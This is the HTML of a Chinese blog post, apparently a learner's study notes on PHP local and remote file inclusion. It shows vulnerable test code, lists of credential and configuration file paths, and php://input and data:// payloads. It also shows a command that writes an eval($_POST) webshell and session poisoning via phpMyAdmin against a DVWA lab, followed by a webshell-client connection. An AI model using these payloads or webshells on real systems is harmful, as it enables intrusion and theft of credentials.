@@ -1,0 +1,1040 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web漏洞学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文件包含漏洞学习文件包含漏洞相关知识点什么是文件包含？​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。 文件包含函数 re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞学习笔记">
+<meta property="og:url" content="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件包含漏洞学习文件包含漏洞相关知识点什么是文件包含？​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。 文件包含函数 re">
+<meta property="og:image" content="d:%5C%E5%9B%BE%E7%89%87%5C9272355-7889a572371b18c8.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-952116d80dc7f768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-e288840e08e52b5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/376">
+<meta property="og:image" content="c:/Users/尚慧亮/Pictures/Saved%20Pictures/QQ截图20200123104221.png">
+<meta property="og:image" content="c:/Users/尚慧亮/Pictures/Saved%20Pictures/QQ截图20200123105708.png">
+<meta property="og:image" content="c:/Users/尚慧亮/Pictures/Saved%20Pictures/QQ截图20200123103711.png">
+<meta property="og:image" content="c:/Users/尚慧亮/Pictures/Saved%20Pictures/QQ截图20200123113838.png">
+<meta property="og:image" content="c:/Users/尚慧亮/Pictures/Saved%20Pictures/QQ截图20200123113851.png">
+<meta property="og:image" content="c:/Users/尚慧亮/Pictures/Saved%20Pictures/QQ截图20200203184038.png">
+<meta property="og:image" content="c:/Users/尚慧亮/Pictures/Saved%20Pictures/QQ截图20200203182852.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-5449b681b9c47ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-0fce621191e72481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/885">
+<meta property="og:image" content="d:%5C%E5%9B%BE%E7%89%87%5C9272355-dd5195fec4210a53.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-1e7dd8fd1a028711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-940bb1d740bd0d47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/723">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-c833b1fd110b6170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-5304d206d0b1fcc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/729">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-44a9d0f1054d26b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790">
+<meta property="og:image" content="d:%5C%E5%9B%BE%E7%89%87%5C9272355-041eece378dca1e4.png">
+<meta property="og:image" content="d:%5C%E5%9B%BE%E7%89%87%5C9272355-489da319d283d845.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-f9f0db6a9d7ff53a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/964">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-738380f7e8b09e46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1195">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-ff2a0beae4cc4468.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-f5d368a6f62b9802.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/889">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9272355-e094a1b3f7e98f45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200">
+<meta property="article:published_time" content="2020-04-03T04:42:02.000Z">
+<meta property="article:modified_time" content="2020-04-08T06:28:58.656Z">
+<meta property="article:author" content="Shu1L">
+<meta property="article:tag" content="web漏洞学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:%5C%E5%9B%BE%E7%89%87%5C9272355-7889a572371b18c8.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/"/>
+
+
+
+
+
+  <title>文件包含漏洞学习笔记 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件包含漏洞学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T12:42:02+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">web漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
+<h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul>
+<li>require()</li>
+<li>require_once()</li>
+<li>include()</li>
+<li>include_once()</li>
+</ul>
+<p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-7889a572371b18c8.png" alt=""></p>
+<h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
+<p>示例代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p>
+<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
+<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = On
+allow_url_include = On，重启apache，即可生效</code></pre>
+<p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
+<pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2
+ <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-952116d80dc7f768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>1.png</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-e288840e08e52b5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/376" alt="img"></p>
+<p>2.png<br> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p>
+<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><strong>常见的敏感信息目录：</strong></p>
+<p>window系统：</p>
+<ul>
+<li>c:\boot.ini //查看系统版本</li>
+<li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li>
+<li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li>
+<li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li>
+<li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li>
+<li>c:\windows\php.ini // php 配置信息</li>
+</ul>
+<p>Linux系统</p>
+<ul>
+<li>/etc/passwd // 账户信息</li>
+<li>/etc/shadow // 账户密码文件</li>
+<li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li>
+<li>/etc/my.conf // mysql 配置文件</li>
+</ul>
+<h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p>
+<p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104312.png)</p>
+<p>2.或者通过猜测默认的session存放位置</p>
+<p>linux下的默认存储目录为/var/lib/php/session</p>
+<p><strong>利用过程</strong></p>
+<p>我们可以先使用文件包含上传恶意代码，比如</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span></code></pre>
+<p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104221.png" style="zoom:80%;" />
+
+<p>我们发现在本地session所在目录下存储了session的值</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123105708.png" style="zoom:80%;" />
+
+<p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123103711.png" style="zoom:150%;" />
+
+<p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104500.png)</p>
+<h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
+<p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
+<p><strong>测试代码</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>当我们直接包含本地的test.txt时</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123113838.png" style="zoom:67%;" />
+
+<p>我们在test.txt加上%00进行截断</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123113851.png" style="zoom:67%;" />
+
+
+
+
+
+
+
+<p><strong>四、路径长度限制</strong></p>
+<p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p>
+<pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；
+linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p>
+<pre><code>&lt;?php
+   $filename =$_GET[&#39;filename&#39;];
+   include($filename . &quot;.html&quot;);
+   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<pre><code>allow_url_fopen = On（是否允许打开远程文件）
+allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p>
+<p>测试代码：</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename);
+?&gt;</code></pre><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203191630.png)</p>
+<h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
+<p><strong>php伪协议类别</strong></p>
+<ul>
+<li>file://    访问本地文件系统</li>
+<li>http://   访问HTTP（s)网址</li>
+<li>ftp://     访问FTP(s) URLs</li>
+<li>php://      访问各个输入/输出流</li>
+<li>zlib://     压缩流</li>
+<li>data://  数据</li>
+</ul>
+<p><strong>php://filter(本地磁盘文件进行读取）</strong></p>
+<p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p>
+<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
+<p>条件：需要开启allow_url_fopen</p>
+<p>示例：</p>
+<p>本地新建file.php</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200128205700.png)</p>
+<p>我们使用php伪协议在本地读取shell.php文件中的内容</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200128205953.png)</p>
+<p>对得到的Base64进行解码即可。</p>
+<p><strong>file://伪协议（读取文件内容）</strong></p>
+<p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
+<p>示例：</p>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203184038.png" style="zoom:67%;" />
+
+
+
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>用法：?file=php://input 数据利用POST传过去。</p>
+<p>利用条件：</p>
+<p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p>
+<pre><code>&lt;?phpinfo();?&gt;
+&lt;?php system(&#39;whoami&#39;);?&gt;
+&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p>
+<pre><code>index.php
+?file=php://input
+
+POST:
+&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>测试代码：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
+<span class="token delimiter">?></span></code></pre>
+<img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203182852.png" style="zoom:67%;" />
+
+<h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
+<pre><code>&lt;?php
+    $filename  = $_GET[&#39;filename&#39;];
+    include($filename);
+?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
+<p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203183726.png)</p>
+<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
+<p>利用条件：</p>
+<p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
+<p>示例1：</p>
+<pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-5449b681b9c47ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>执行命令：</p>
+<pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-0fce621191e72481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/885" alt="img"></p>
+<p>示例2：</p>
+<pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
+<p><strong>包含session</strong></p>
+<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
+<p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-dd5195fec4210a53.png" alt=""></p>
+<p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-1e7dd8fd1a028711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608" alt="img"></p>
+<p>常见的php-session存放位置还有这几个：</p>
+<pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre>
+<p>使用以下命令可查看到session文件中的登录信息</p>
+<pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-940bb1d740bd0d47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/723" alt="img"></p>
+<p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-c833b1fd110b6170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9272355-5304d206d0b1fcc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/729" alt="img"></p>
+<p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
+<p>加上cookie之后在重新连接，成功连接</p>
